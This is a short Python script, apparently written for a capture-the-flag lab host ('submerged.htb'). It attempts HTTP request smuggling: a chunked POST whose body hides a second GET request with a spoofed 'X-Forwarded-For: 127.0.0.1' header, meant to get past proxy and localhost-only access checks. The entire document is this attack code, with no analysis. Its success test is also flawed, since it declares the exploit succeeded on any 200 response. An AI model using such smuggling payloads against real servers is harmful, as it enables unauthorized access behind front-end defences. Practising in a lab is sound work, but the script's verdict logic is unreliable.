import requests

# Target URL
url = "http://submerged.htb"

# Malicious request to exploit HTTP request smuggling
headers = {"Host": "submerged.htb", "Transfer-Encoding": "chunked"}

# Constructing the malicious payload
payload = (
    "0\r\n"
    "\r\n"
    "GET / HTTP/1.1\r\n"
    "Host: submerged.htb\r\n"
    "X-Forwarded-For: 127.0.0.1\r\n"
    "\r\n"
)

# Sending the request
response = requests.post(url, headers=headers, data=payload)

# Checking the response
if response.status_code == 200:
    print("Exploit succeeded! Check if the server is vulnerable.")
else:
    print("Exploit failed.")

print(response.text)
